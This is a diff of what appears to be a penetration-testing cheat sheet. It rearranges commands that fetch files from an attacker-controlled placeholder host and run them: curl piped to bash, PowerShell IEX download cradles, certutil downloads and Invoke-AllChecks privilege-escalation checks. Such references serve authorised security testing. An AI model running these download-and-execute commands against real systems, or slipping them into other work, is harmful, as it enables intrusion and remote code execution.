@@ -1386,15 +1386,15 @@ curl {IP ADDRESS}/{FILE}
 # Linux - Download file and execute in bash:
 curl {IP ADDRESS}/{FILE.sh} | bash
 
-# Windows - Download file and execute in powershell:
-powershell -c 'IEX(New-Object Net.WebClient).downloadstring("http://{IP ADDRESS}/{FILE}")'
-powershell -c 'Invoke-AllChecks'
-
 # Windows - Download file using certutil
 certutil -split -f -urlcache http://{IP ADDRESS}/{FILE}
 
 # Windows - Download file using powershell
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://{IP ADDRESS}/{FILE.exe}','C:\Users\{USER}\{FILE.exe}')"
+IEX(new-object System.Net.WebClient).DownloadFile('http://{IP ADDRESS}/{FILE.exe}','C:\Users\{USER}\{FILE.exe}')
+
+# Windows - Load a string file and execute in powershell:
+IEX(New-Object Net.WebClient).downloadstring("http://{IP ADDRESS}/{FILE}")
+Invoke-AllChecks
 
 # SMB SHARE UPLOAD FILE
 copy \\{IP ADDRESS}\share\{FILE}
